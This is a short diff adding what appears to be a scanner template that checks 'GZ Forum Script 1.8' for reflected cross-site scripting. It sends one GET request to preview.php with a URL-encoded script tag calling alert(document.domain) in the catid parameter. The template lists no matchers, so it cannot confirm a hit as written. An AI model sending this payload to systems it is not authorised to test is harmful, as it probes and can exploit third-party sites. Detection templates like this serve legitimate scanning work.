@@ -1,0 +1,16 @@
+id: gz-forum-script-xss
+brief:
+    title: GZ Forum Script 1.8 - Cross-Site Scripting
+    by: r3Y3r53
+    level: medium
+    about: Cross-site scripting (XSS) is an attack in which an attacker injects malicious executable scripts into the code of a trusted application or website. Attackers often initiate an XSS attack by sendin...
+    label:
+        - gzforum
+        - xss
+        - unauth
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/preview.php?controller=Load&action=index&catid=moztj%22%3E%3Cscript%3Ealert(document.domain)%3C%2fscript%3Ems3ea&down_up=a'
+      signs: []
